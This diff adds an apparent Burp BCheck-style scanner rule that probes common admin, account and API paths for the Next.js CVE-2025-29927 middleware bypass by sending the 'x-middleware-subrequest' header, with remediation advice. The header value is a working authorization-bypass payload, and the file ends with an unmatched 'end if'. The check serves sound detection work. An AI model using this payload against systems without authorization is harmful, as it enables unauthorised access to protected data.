@@ -1,0 +1,64 @@
+metadata:
+  language: v2-beta
+  name: "Next.js CVE-2025-29927 Middleware Bypass"
+  description: "Checks common protected paths for Next.js middleware bypass using x-middleware-subrequest"
+  author: "s3c4n0n"
+  tags: "nextjs", "auth-bypass", "middleware", "cve-2025-29927"
+
+run for each:
+  protected_path =
+    "/admin",
+    "/dashboard",
+    "/profile",
+    "/account",
+    "/settings",
+    "/user",
+    "/users",
+    "/me",
+    "/billing",
+    "/orders",
+    "/reports",
+    "/internal",
+    "/portal",
+    "/app",
+    "/api/admin",
+    "/api/user",
+    "/api/users",
+    "/api/me",
+    "/api/account",
+    "/api/profile",
+    "/api/settings",
+    "/api/protected",
+    "/api/internal"
+
+given request then
+  send request called normal_check:
+    replacing method: "GET"
+    replacing path: {protected_path}
+    removing query_string
+
+  send request called mw_bypass:
+    replacing method: "GET"
+    replacing path: {protected_path}
+    removing query_string
+    replacing headers:
+      "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+
+  if {mw_bypass.response.status_code} is "200" and not({normal_check.response.status_code} is "200") then
+    report issue and continue:
+      name: "Next.js middleware authorization bypass"
+      severity: high
+      confidence: firm
+      remediation: "Upgrade Next.js 13.x to 13.5.9 or later. Also block external requests containing the x-middleware-subrequest header at the edge/WAF."
+      detail: `CVE-2025-29927 style middleware bypass behavior was observed at {protected_path}. The normal request returned {normal_check.response.status_code}, but the request with x-middleware-subrequest returned 200. Manually verify authorization impact with the authenticated and unauthenticated roles.`
+  end if
+
+  if {mw_bypass.response.status_code} is "302" and not({normal_check.response.status_code} is "302") then
+    report issue and continue:
+      name: "Potential Next.js middleware behavior change"
+      severity: medium
+      confidence: tentative
+      remediation: "Review middleware authorization logic and upgrade Next.js 13.x to 13.5.9 or later."
+      detail: `Potential middleware behavior difference at {protected_path}. Normal status: {normal_check.response.status_code}. Middleware-header status: {mw_bypass.response.status_code}. Manually compare Location headers and response bodies.`
+  end if
+end if
